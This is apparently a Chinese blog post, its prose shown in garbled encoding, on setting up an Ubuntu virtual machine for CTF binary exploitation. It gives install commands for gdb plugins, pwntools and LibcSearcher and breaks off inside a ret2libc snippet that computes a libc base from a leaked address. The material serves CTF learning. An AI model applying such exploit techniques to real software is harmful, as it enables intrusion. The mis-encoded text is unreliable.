2023","permalink":"/tags/schedole/","section":"Tags","summary":"","title":"schedole"},{"content":"","date":"July 12, 2023","permalink":"/series/schedole/","section":"Series","summary":"","title":"schedole"},{"content":" å‰è¨€ # å­¦ä¹ pwnå·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä½†æ˜¯ç”±äºä¹‹å‰è‡ªå·±ä¸€ç›´æ²¡æœ‰æ³¨æ„æ–‡ä»¶ç®¡ç†ï¼Œä¹Ÿæ²¡æœ‰å¥½çš„æ•´ç†ä¹ æƒ¯ï¼Œå¯¼è‡´ç°åœ¨æ‰“pwnä¸»ç”¨çš„ubuntuè™šæ‹Ÿæœºçš„æ–‡ä»¶å¤¹ååˆ†çš„æ··ä¹±ï¼Œè™½ç„¶å…¶å®ä¸å½±å“ç›®å‰é˜¶æ®µçš„å­¦ä¹ å’Œåšé¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³æ‰¾ä¸€ä¸ªå¥‘æœºæ¥é‡è£…ä¸€ä¸‹è™šæ‹Ÿæœºã€‚æ­£å¥½ç°åœ¨åœ¨å‡æœŸæ—¶é—´ï¼Œæ²¡æœ‰é‚£ä¹ˆå¿™ï¼Œæƒ³ç€é‡å¤´å¼€å§‹æ­å»ºPWNç¯å¢ƒï¼Œå¹¶åšä¸€ä¸‹è®°å½•ï¼Œä¸€æ¥æ–¹ä¾¿ä»¥åçš„è‡ªå·±å›æ¥çœ‹ï¼ŒäºŒæ¥ä¹Ÿå¯ä»¥ä¸ºå…¶ä»–æƒ³é‡è£…ubuntuçš„PWNç¯å¢ƒæˆ–è€…æ˜¯æƒ³å…¥é—¨PWNçš„å¸ˆå‚…æä¾›ä¸€äº›å‚è€ƒã€‚\nï¼ˆæ³¨1ï¼šæœ¬æ–‡åœ¨éƒ¨åˆ†å·¥å…·å®‰è£…åä¼šè¡¥å……ä¸€äº›åŸºç¡€ç”¨æ³•ï¼Œå·²ç»å®‰è£…äº†å·¥å…·çš„å¸ˆå‚…ä»¬ä¹Ÿå¯ä»¥çœ‹ä¸€çœ‹ï¼‰\nï¼ˆæ³¨2ï¼šå®‰è£…çš„å·¥å…·ä¸å…¨æ˜¯å…³äºPWNçš„ï¼Œä¸æ‰“pwnçš„å¸ˆå‚…ä»¬ä¹Ÿå¯ä»¥æŒ‘ç€çœ‹ğŸ‘€ï¼‰\nä»¥ä¸‹æ˜¯æœ¬æ–‡æ‰€å®‰è£…çš„å·¥å…·åˆ—è¡¨ï¼Œå¤§å®¶å¯ä»¥æŒ‰é¡ºåºå®‰è£…ã€‚\nè™šæ‹Ÿæœºå®‰è£…ï¼ˆå‰ç½®æ¡ä»¶ï¼‰ åŸºç¡€å·¥å…· vim git gcc qemuï¼ˆç›®å‰ä¸å¸¸ç”¨ï¼Œå¯ä»¥è·³è¿‡ï¼‰ python3 ä¸ pip3 ï¼ˆè¿™ä¸ªè¦å…ˆè£…ï¼Œä¹‹åçš„å·¥å…·å®‰è£…å¯èƒ½ä¼šç”¨åˆ°pip3ï¼‰ gdb åŠæ’ä»¶ peda pwndbg gef gdb-multiarch ï¼ˆè¿™ä¸ªå¯ä»¥å…ˆè·³è¿‡ï¼‰ python PWN ç›¸å…³åº“ pwntools LibcSearcher LibcSearcher3ï¼ˆå¯é€‰ï¼‰ LibcSearcherXï¼ˆå¯é€‰ï¼‰ pwnmodulesï¼ˆå¯é€‰ï¼‰ PWN ç›¸å…³å·¥å…· ROPgadget one_gadget glibc-all-in_one patchelf pwnç›¸å…³å‘½ä»¤è¡¥å…… seccomp-tools main_arena_offset python Crypto ç›¸å…³åº“ gym2 sage mathï¼ˆCryptoï¼‰ æé«˜ä½“éªŒçš„ç›¸å…³å·¥å…· ï¼ˆå¯ä»¥åœ¨é…ç½®pwnç¯å¢ƒä¹‹å‰å…ˆè£…å¥½ï¼‰ Oh-My-Zsh ï¼ˆå¯é€‰ï¼‰ terminatorï¼ˆå¯é€‰ï¼‰ è™šæ‹Ÿæœºå®‰è£… # ç›®å‰æµè¡Œçš„è™šæ‹Ÿæœºè½¯ä»¶æœ‰VMwareã€Virtual Boxå’ŒVirtual PCç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨Windowsä¸Šé¢è‡ªå¸¦çš„è™šæ‹Ÿæœºï¼Œä¸åŒè™šæ‹Ÿæœºè½¯ä»¶å„æœ‰ä¼˜åŠ£ï¼Œæˆ‘å½“æ—¶å…¥é—¨çš„æ—¶å€™æ˜¯é€‰æ‹©äº†VMware 16è™šæ‹Ÿæœºï¼Œæ„Ÿè§‰å®‰è£…èµ·æ¥ä¸ç®—å¾ˆå¤æ‚ã€‚\nå…³äºlinuxæ“ä½œç³»ç»Ÿçš„é€‰æ‹©ï¼Œæ‰“pwnçš„å¸ˆå‚…ä»¬ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨ubuntuï¼Œç‰ˆæœ¬çš„é€‰æ‹©åˆ™æ˜¯æœ€æ–°çš„é•¿æœŸæ”¯æŒç‰ˆæœ¬ 22.04ï¼ˆubuntu 23å¹¶ä¸æ˜¯é•¿æœŸæ”¯æŒçš„ç‰ˆæœ¬ï¼‰ã€‚è™½ç„¶ä¹‹å‰çš„å¾ˆå¤šé¢˜ç›®éƒ½æ˜¯åœ¨Ubuntu 20 æˆ–è€…18 ç”šè‡³æ˜¯16 çš„ç¯å¢ƒä¸‹ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ patchelf å·¥å…·ç­‰æ–¹æ³•æ¥å®Œæˆé¢˜ç›®ï¼Œè€Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œåé¢æ–°å‡ºçš„pwné¢˜éƒ½æ˜¯ä¼šé€æ¸åœ¨è¾ƒæ–°çš„ç¯å¢ƒåœ¨è¿è¡Œï¼Œæ‰€ä»¥æ¨èå¤§å®¶ç›´æ¥å®‰è£…æœ€æ–°çš„é•¿æœŸæ”¯æŒçš„ç‰ˆæœ¬â€”â€”ubuntu 22.04ï¼š\nubuntu-22.04.2-desktop-amd64.iso\nå¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ï¼š # 1.å…³äºç£ç›˜å®¹é‡çš„é—®é¢˜ï¼š\nè™½ç„¶å¾ˆå¤šæ•™ç¨‹éƒ½æ¨èæœ€å¤§ç£ç›˜å®¹é‡ä¸º20gï¼Œä½†æ˜¯åœ¨æˆ‘çš„å®é™…ä½“éªŒä¸­ï¼Œæ„Ÿè§‰å†…å­˜è¿˜æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œç‰¹åˆ«æ˜¯å½“è™šæ‹Ÿæœºé‡Œå·²ç»è£…äº†sage mathç­‰æ¯”è¾ƒå¤§çš„å·¥å…·æ—¶ï¼Œå¯ç”¨ç©ºé—´å°±ä¸æ˜¯ç‰¹åˆ«çš„å……è¶³ï¼Œè¿™ä¸ªæ—¶å€™å€˜è‹¥ä½ åˆšå¥½æƒ³åšä¸€é“ç£ç›˜å–è¯é¢˜ï¼Œå´å‘ç°ç£ç›˜å¤ªå¤§ä¸èƒ½å¤Ÿæ”¾å…¥linuxè™šæ‹Ÿæœºä¸­ï¼Œå¯èƒ½ä¼šæœ‰ç‚¹éš¾å—ã€‚\nè™½ç„¶ç£ç›˜ç©ºé—´åœ¨è£…å¥½è™šæ‹Ÿæœºä¹‹åä¹Ÿèƒ½æ›´æ”¹ï¼Œä½†æ˜¯éœ€è¦è™šæ‹ŸæœºæŠŠæ‰€æœ‰çš„å¿«ç…§éƒ½åˆ é™¤æ‰ï¼Œè¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ã€‚æ‰€ä»¥å»ºè®®å¸ˆå‚…ä»¬ä¸€å¼€å§‹å°±è®¾ç½®ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç£ç›˜å®¹é‡ï¼Œåæ­£æ˜¯å®é™…ä½¿ç”¨å¤šå°‘å°±å ç”¨å¤šå°‘ç©ºé—´çš„ã€‚\n2.å…³äºæ‰“å°æœºçš„ä¸€ç‚¹å‘ï¼š\nå½“åˆ›å»ºå¥½è™šæ‹Ÿæœºæ—¶ä¼šæœ‰è‡ªå®šä¹‰ç¡¬ä»¶çš„é€‰é¡¹ï¼Œä¸€å¼€å§‹é»˜è®¤ä¼šæœ‰æ‰“å°æœºï¼Œæœ€å¥½ç§»é™¤æ‰“å°æœºï¼Œå¦‚æœæ²¡æœ‰ç§»é™¤æ‰“å°æœºçš„è¯éƒ¨åˆ†è™šæ‹Ÿæœºå¯èƒ½ä¼šå‡ºç°é»‘å±ç­‰é—®é¢˜ã€‚\nå¦‚æœå·²ç»å®‰è£…å®Œäº†ï¼Œä¹Ÿå¯ä»¥ç‚¹ç¼–è¾‘è™šæ‹Ÿæœºè®¾ç½®ç§»é™¤æ‰“å°æœºï¼š\n3.å…³äºè¿ç½‘çš„é—®é¢˜ï¼š\n# æ£€æŸ¥è”ç½‘æƒ…å†µï¼Œå³é”®æ‰“å¼€ç»ˆç«¯è¾“å…¥æŒ‡ä»¤ï¼š ping baidu.com å¦‚æœè¿ä¸ä¸Šç½‘çš„è¯å¯èƒ½éœ€è¦è‡ªå·±æŸ¥åšå®¢æ’æŸ¥åŸå› ï¼Œå®åœ¨ä¸è¡Œå°±åˆ æ‰é‡æ–°å†å®‰è£…ä¸€æ¬¡ï¼Œç¬¬ä¸€æ¬¡å®‰è£…å‡ºä¸€äº›å°é—®é¢˜å¾ˆæ­£å¸¸ï¼Œæ‰€ä»¥çœ‹æ•™ç¨‹çš„æ—¶å€™ä¸€å®šè¦åšå¥½æ¯ä¸€æ­¥ã€‚\n4.å…³äºè½¯ä»¶æºæ›´æ¢ï¼š\nä¸æƒ³åœ¨ä¸‹å®‰è£…/æ›´æ–°è½¯ä»¶æ—¶ç­‰æ¯”è¾ƒé•¿çš„æ—¶é—´çš„è¯æœ€å¥½è¿˜æ˜¯æ¢æˆå›½å†…çš„è½¯ä»¶æºå§ã€‚å½“ç„¶å¦‚æœä¸æƒ³æ¢çš„è¯ä¹Ÿå¯ä»¥ã€‚æˆ‘ä¸ªäººæ„Ÿè§‰æ¢ä¸æ¢éƒ½æ²¡å…³ç³»ï¼Œå¤§ä¸äº†å®‰è£…/æ›´æ–°è½¯ä»¶æ—¶æ‰¾ä¸€äº›å…¶ä»–çš„äº‹å¹²ï¼Œæ¯”å¦‚çœ‹ç•ª/å†™åšå®¢æ–‡ç« çš„æ—¶å€™æŒ‚åå°ä¸‹è½½ã€‚\nï¼ˆè¡¥å……ï¼šâ€œä¹‹å‰è¸©è¿‡é˜¿é‡Œæºçš„å‘ï¼Œå®˜æ–¹æºè™½ç„¶æ…¢äº†ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜â€â€”â€”æŸå¸ˆå‚…å¦‚æ˜¯è¯´ï¼‰\n5.å…³äºrootï¼š\nubuntuå®‰è£…å®Œä¹‹årootæ˜¯éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®å¯†ç çš„ï¼Œä¸ç„¶ä¸èƒ½åˆ‡æ¢ä¸ºrootç”¨æˆ·ã€‚æ­¥éª¤å¦‚ä¸‹ï¼š\n# å…ˆç”¨æˆ‘ä»¬çš„åˆå§‹ç”¨æˆ·å³é”®æ‰“å¼€ç»ˆç«¯ï¼Œ # è¾“å…¥å‘½ä»¤ï¼š sudo passwd # è¾“å…¥æ–°å¯†ç ï¼Œå¹¶é‡å¤è¾“å…¥å¯†ç ï¼Œæœ€åæç¤ºæˆåŠŸæ›´æ–°å³å¯ æ­¤æ—¶å·²å®Œæˆrootå¯†ç çš„è®¾ç½®\n6.å…³äºå…±äº«æ–‡ä»¶å¤¹ï¼š\nå¯ä»¥å‚è€ƒï¼š Ubuntuå…±äº«æ–‡ä»¶å¤¹çš„åˆ›å»ºå’Œä½¿ç”¨ - çŸ¥ä¹ (zhihu.com)\n# é¦–å…ˆè¾“å…¥ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ˜¯å¦çœŸçš„è®¾ç½®æˆåŠŸå…±äº«æ–‡ä»¶å¤¹ # ä¸ä¼šè®¾ç½®çš„è¯å°±ç‚¹ä¸Šé¢çš„é“¾æ¥çœ‹ä¸€ä¸‹å°±ä¼šäº† vmware-hgfsclient # è¿›å…¥å…±äº«æ–‡ä»¶å¤¹ cd /mnt/hgfs/your_shareDir_name å…·ä½“å®‰è£… # ï¼ˆå› ä¸ºæ€•æœ‰äº›å‘å¤§å®¶å…ˆè·³è¿›å»äº†ï¼Œæ‰€ä»¥å°±æŠŠæ³¨æ„äº‹é¡¹æ”¾åœ¨å‰é¢äº†ï¼Œå¤§å®¶é‡åˆ°é—®é¢˜å¯ä»¥å…ˆå¾€å‰ç¿»ä¸€ç¿»çœ‹çœ‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸Šæœç´¢å¼•æ“æœï¼‰\nå…³äºè™šæ‹Ÿæœºçš„å…·ä½“å®‰è£…è¿‡ç¨‹ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œå¯ä»¥ç›´æ¥åœ¨ç½‘ä¸Šæœç°æˆçš„æ•™ç¨‹ï¼Œç½‘ä¸Šçš„å¸ˆå‚…ä»¬éƒ½å†™çš„éå¸¸è¯¦ç»†äº†ï¼Œè¿™é‡Œä¹Ÿç»™å¤§å®¶æ”¾ä¸Šä¸€ç¯‡æ¯”è¾ƒè¯¦ç»†çš„æ•™ç¨‹ï¼Œå¸ˆå‚…ä»¬å¯ä»¥ç›´æ¥ç‚¹å‡»è·³è½¬ï¼š\nåœ¨VMware16è™šæ‹Ÿæœºå®‰è£…Ubuntuè¯¦ç»†æ•™ç¨‹\nå…³äºå·¥å…·å®‰è£…çš„æé†’ï¼š\nç¬¬ä¸€æ¬¡æ¥è§¦ linux çš„å¸ˆå‚…ä»¬å¯ä»¥å…ˆå»å­¦ä¹ ä¸€äº› linux çš„åŸºæœ¬æ“ä½œå†å›æ¥æ¥ç€çœ‹ åç»­å‡ºç°çš„æ‰€æœ‰åè¯å¦‚æœæœ‰ä¸æ‡‚çš„å¯ä»¥ç›´æ¥ä¸Šæœç´¢å¼•æ“æŸ¥è¯¢ï¼Œæ°¸è¿œè®°ä½ï¼šæœç´¢å¼•æ“æ˜¯æˆ‘ä»¬ CTFers çš„å¥½ä¼™ä¼´ï¼ å»ºè®®å¤§å®¶åœ¨å®‰è£…å„ç§å·¥å…·æ—¶å¤šæ‹å¿«ç…§ï¼Œå®‰è£…é”™è¯¯åå¯ä»¥ç›´æ¥æ¢å¤åˆ°ä¹‹å‰çš„å¿«ç…§ Ubuntuçš„è™šæ‹Ÿæœºå¤§å°å¤§æ¦‚åœ¨30g~60gï¼Œå¤§å®¶å¹³ä½¿ç”¨è®°å¾—ç•™è¶³ç©ºé—´ï¼Œå¿«ç…§åŸºæœ¬éƒ½åœ¨1gä»¥ä¸Šï¼Œä¸ç”¨çš„å¿«ç…§åŠæ—¶åˆ é™¤ï¼Œä½†æ˜¯è‡³å°‘è¦ç•™æœ‰ä¸€ä¸ªå¿«ç…§ï¼ ç°åœ¨ï¼Œå¼€å¯æˆ‘ä»¬çš„PWNç¯å¢ƒæ­å»ºä¹‹æ—…å§ï¼Œå¤§æ¦‚è€—æ—¶30åˆ†é’Ÿ~90åˆ†é’Ÿï¼ˆå…·ä½“çœ‹å¤§å®¶çš„linuxç†Ÿç»ƒåº¦å’Œç½‘é€Ÿï¼‰ åŸºç¡€å·¥å…· # ä¸€äº›æ¯”è¾ƒåŸºç¡€çš„å·¥å…·ã€‚\n1. vim\nè¿™ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨å¯èƒ½æ–°æ‰‹ä¸å¤ªå¸¸ç”¨ï¼Œä¸è¿‡ä»¥åè¿Ÿæ—©ä¼šç”¨åˆ°çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå®‰è£…å¥½ï¼Œåæ­£ä¸ç”¨èŠ±å¤šå°‘æ—¶é—´ [doge]\n# å®‰è£… sudo apt install vim # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ #æ³•ä¸€ï¼Œä¸è¿‡æ‰“å°(è¾“å‡º)å‡ºæ¥çš„ä¸œè¥¿æœ‰ç‚¹å¤š vim --version # æ³•äºŒï¼Œä¸è¿‡éœ€è¦çœ‹æç¤ºé€€å‡ºç¼–è¾‘å™¨ç•Œé¢ vim -v å¦‚ä½•é€€å‡ºvimç¼–è¾‘å™¨ï¼š\nvimé€€å‡ºæ—¶è¦å…ˆæŒ‰ : (åŠ shiftå˜æˆå†’å·) ï¼Œçœ‹åˆ°å…‰æ ‡åˆ°äº†åº•ä¸‹å†æŒ‰q + enteré€€å‡ºï¼Œw + enter ä¿å­˜åé€€å‡º\næ¨èé˜…è¯»ï¼š\nç²¾é€š VIM ï¼Œæ­¤æ–‡å°±å¤Ÿäº† - çŸ¥ä¹ (zhihu.com)\nLinux vi/vim | èœé¸Ÿæ•™ç¨‹ (runoob.com)\nå²ä¸Šæœ€å…¨çš„Vimå‘½ä»¤ ï¼ˆè¿™ä¸ªæœ‰ç‚¹å¤šï¼Œå…¶å®æ²¡å¿…è¦ï¼Œæˆ‘åªæ˜¯æ”¾åœ¨è¿™å½“ä¹¦ç­¾ğŸ¶ï¼‰\n2. git\nè¿™ä¸ªä¸å¤šè¯´äº†ï¼Œå¿…è£…\n# å®‰è£… sudo apt install git # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ git --version 3. gcc\nè¿™ä¸ªä¹Ÿæ˜¯å¿…è£…çš„\nï¼ˆå­¦pwnçš„è¯æ˜¯å¿…é¡»è¦å­¦Cè¯­è¨€çš„ï¼‰\n# å®‰è£… sudo apt install gcc # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ gcc -v 4. qemu ï¼ˆå¯è·³ï¼‰\nï¼ˆç›®å‰è¿˜ä¸å¤ªå¸¸ç”¨ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥å…ˆè£…ç€ï¼‰\n# å®‰è£… sudo apt-get install qemu-user qemu-system # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ qemu- 5. python3 ä¸ pip3\nubuntu å·²ç»é»˜è®¤è£…å¥½äº†python3ï¼Œå¦‚æœæƒ³ç”¨python2çš„è¯å¯ä»¥è‡ªå·±è£…ï¼Œä¸è¿‡ç°åœ¨å·²ç»ä¸æ¨èç”¨python2äº†\n# å®‰è£…pip3 sudo apt install python3-pip # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ pip -V # è®¾ç½®pythonå‘½ä»¤é»˜è®¤ä¸ºpython3 sudo apt install python-is-python3 # å®‰è£…å‰ä¼šæ˜¾ç¤ºæ‰¾ä¸åˆ°å‘½ä»¤ â€œpythonâ€ï¼Œå®‰è£…åå¯ä»¥æ­£å¸¸ä½¿ç”¨pythonæŒ‡ä»¤ # å…¶å®å®‰è£…è¿™ä¸ªè½¯ä»¶åŒ…åªæ˜¯ä¸ºäº†å°‘æ‰“é‚£ä¸ªâ€œ3â€,æ‰€ä»¥ä¹Ÿå¯ä»¥ä¸è£…[doge] gdb æ’ä»¶ # å‰æ’æç¤ºï¼šPWNer å¿…é¡»å­¦ä¼šä½¿ç”¨ gdbï¼ï¼ï¼\nï¼ˆubuntué»˜è®¤è£…æœ‰æ™®é€šçš„gdbï¼Œå…¶å®ä¹Ÿä¸æ˜¯ä¸èƒ½ç›´æ¥ç”¨ï¼Œä¸è¿‡è¿˜æ˜¯å®‰è£…ä¸€äº›æ’ä»¶æ¯”è¾ƒå¥½ï¼‰\n1. peda\n# git git clone https://github.com/longld/peda.git echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit # æµ‹è¯•ï¼š gdb 2. pwndbg\n# (æ—¶é—´è¾ƒé•¿) git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # æµ‹è¯•ï¼š gdb 3. gef\n# git git clone https://github.com/hugsy/gef.git echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit # æµ‹è¯•ï¼š gdb ä¸‰ä¸ªæ’ä»¶ä½¿ç”¨æŒ‡å—\nå¹³æ—¶ä½¿ç”¨æ–¹å¼ä¸€ï¼šï¼ˆæ³¨é‡Šæ³•ï¼‰\nsudo vim ~/.gdbinit # vimåå‚ç…§ç¬¬ä¸€è¡Œçš„å†…å®¹ï¼Œåœ¨æ–‡ä»¶å†…è¾“å…¥ä¸‹æ–¹æ¨ªçº¿ä¸­å†…å®¹ #ï¼ˆæ³¨æ„æ¯ä¸ªäººçš„è·¯å¾„æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥è¦è¾“å…¥çš„å†…å®¹ä¹Ÿæ˜¯ä¸åŒçš„ï¼‰ # é€‰æ‹©ä½ è¦ç”¨çš„ä¸€ä¸ªï¼Œå¦å¤–ä¸¤ä¸ªæ³¨é‡Šæ‰ï¼Œä¿å­˜é€€å‡º # åŸæ¥ï¼š echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit ### ä½¿ç”¨pwndbg: # echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit å¹³æ—¶ä½¿ç”¨æ–¹å¼äºŒï¼šï¼ˆå¤šæ‰“ä¸€è¡Œå‘½ä»¤æ³•ï¼šï¼‰\n# ä½¿ç”¨å‰å¤šæ‰“ä¸€è¡Œå‘½ä»¤ # è·¯å¾„éœ€è¦æ ¹æ®è‡ªå·±çš„å®‰è£…è·¯å¾„æ›´æ”¹ ### ä½¿ç”¨peda: echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gdb ### ä½¿ç”¨pwndbg: echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit gdb ### ä½¿ç”¨gef: echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit gdb åœ¨expè„šæœ¬ä¸­è°ƒç”¨gdbè°ƒè¯•æ—¶ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªå‡½æ•°æ¥è§£å†³ï¼š\nfrom pwn import * taolve = process(\u0026#39;./pwn\u0026#39;) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) #ä½¿ç”¨pwndbg,å…¶ä»–åŒç† _gdb(1) 4. gdb-multiarchï¼ˆå¯é€‰ï¼‰\nï¼ˆç›®å‰å¯èƒ½è¿˜ç”¨ä¸åˆ°ï¼Œå¤§å®¶å¯ä»¥å…ˆè·³è¿‡ï¼‰\nä»¥ä¸‹ä¸ºARMå’ŒMIPSçš„äº¤å‰ç¼–è¯‘åŠè¿è¡Œç¯å¢ƒï¼Œå®‰è£…å¯å‚è€ƒ hollk å¤§ä½¬çš„æ–‡ç« ï¼š\nubuntu20.04 PWNï¼ˆå«x86ã€ARMã€MIPSï¼‰ç¯å¢ƒæ­å»º\ngdb-multiarch gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 ARM PWN â€”â€” ARMè½¯ä»¶åŒ… MIPS PWN â€”â€” MIPSè½¯ä»¶åŒ… python PWN ç›¸å…³åº“\npwntools # ï¼ˆpsï¼šåé¢çš„å·¥å…·æ¯”è¾ƒå¤šï¼Œå¯ä»¥ä¸“é—¨åœ¨æ ¹ç›®å½•ä¸Šæ–°å»ºä¸€ä¸ªtoolsæ–‡ä»¶å¤¹æ¥æ”¾å·¥å…·ï¼‰\n# pip3ç›´æ¥å®‰è£…ï¼š sudo apt-get update sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools # å…ˆgitä¸‹æ¥å†ç”¨pip3å®‰è£…ï¼šï¼ˆå¥½åƒæ³•2ä¼šå¿«ä¸€äº›ï¼‰ git clone https://github.com/Gallopsled/pwntools.git sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools # æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ python3 from pwn import * # æ²¡æœ‰æŠ¥é”™å°±è¯´æ˜è£…å¥½äº† æ³¨ï¼šè¾“å…¥ quit() é€€å‡ºPythonäº¤äº’æ¨¡å¼\nåˆæ³¨ï¼šä¹‹å‰ç”¨æˆ·åä¸º\u0026quot;pwner\u0026quot;çš„è™šæ‹Ÿæœºæ˜¯å…¥é—¨æ—¶ç”¨åˆ°ç°åœ¨çš„è€è™šæ‹Ÿæœºï¼Œè¿˜æ˜¯é»˜è®¤èƒŒæ™¯å’Œé…è‰²ï¼Œç”¨æˆ·åä¸º\u0026quot;ta0lve\u0026quot;çš„è™šæ‹Ÿæœºæ˜¯ä»Šå¤©åˆšè£…çš„æ–°è™šæ‹Ÿæœºï¼Œä¸ªæ€§åŒ–é…ç½®è§æœ¬æ–‡çš„æœ€åï¼š terminator ï¼ˆå¯é€‰ï¼‰\nåŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼š\npwntoolsçš„å®‰è£…åŠåŸºæœ¬ä½¿ç”¨\npwntools â€” pwntools 4.10.0 documentation\nLibcSearcher # # å®‰è£…æ­¥éª¤ä¸€ï¼š sudo pip3 install LibcSearcher # æœ€å¥½å…ˆå®Œæˆæ­¥éª¤ä¸€å†å®Œæˆæ­¥éª¤äºŒï¼Œä¸è¿‡å¯èƒ½ä¼šç”±äºç½‘ç»œé—®é¢˜å®‰è£…ä¸äº†ï¼Œ # å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œå®åœ¨ä¸è¡Œå†ç›´æ¥å®Œæˆæ­¥éª¤äºŒ # åªå®Œæˆäº†æ­¥éª¤äºŒå¦‚æœåœ¨ä½¿ç”¨æ—¶å‡ºç°â€œNo Moudule Name LibcSearcherâ€ï¼Œ # å¯ä»¥å°†pyæ–‡ä»¶å¤åˆ¶åˆ°LibcSearcheræ ¹ç›®å½•ä¸‹ï¼Œ # æˆ–æ˜¯å°†LibcSearcheræ•´ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶ä¸€ä»½åˆ°pyæ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸‹ # å®‰è£…æ­¥éª¤äºŒï¼š git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher sudo python3 setup.py install è¾“å…¥pip list æŸ¥çœ‹æˆ‘ä»¬ä¸‹è½½å¥½çš„åº“ï¼ˆåªå®Œæˆæ­¥éª¤äºŒå¯èƒ½æ‰¾ä¸åˆ°ï¼‰\næŸ¥çœ‹ LibcSearcher.egg-linkæ–‡ä»¶å¯ä»¥å‘ç°ï¼š\nè¯´æ˜æ­¥éª¤ä¸€ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨æ­¥éª¤äºŒçš„æœ¬åœ°ä»“åº“çš„ï¼Œæ‰€ä»¥å»ºè®®ä¸¤ä¸ªéƒ½ä½¿ç”¨~\nå½“ç„¶ï¼Œåªå®Œæˆæ­¥éª¤ä¸€ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚\n# æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ python3 from LibcSearcher import * ï¼ˆå¦‚æœä¸¤ä¸ªæ–¹æ³•éƒ½ä¸è¡Œå¯ä»¥çœ‹ä¸€çœ‹è¿™ä¸ªï¼š LibcSearcherå®‰è£…çš„å¿ƒè·¯å†ç¨‹å’Œå‘ï¼‰\nåŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼šï¼ˆè¿˜æ²¡å…¥é—¨çš„å¸ˆå‚…ä»¬å¯ä»¥ç­‰å­¦åˆ°ret2libcçš„æ—¶å€™å†çœ‹ï¼‰\nfrom pwn import * from LibcSearcher import * # æ¥æ”¶å‡½æ•°çš„gotè¡¨çš„åœ°å€,æ¯”å¦‚æˆ‘è¿™é‡Œæ‹¿åˆ°putså‡½æ•°çš„çœŸå®åœ°å€ puts_real_addr = u64(taolve.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) log.success(\u0026#34;puts_real_addr:\u0026#34;+ hex(puts_real_addr)) # æ‰“å°å‡ºæ¥ç»™è‡ªå·±çœ‹ä¸€çœ‹ libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc.add_condition(\u0026#34;atoi\u0026#34;, 218528) # æ·»åŠ ä¸€ä¸ªçº¦æŸæ¡ä»¶ libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) # 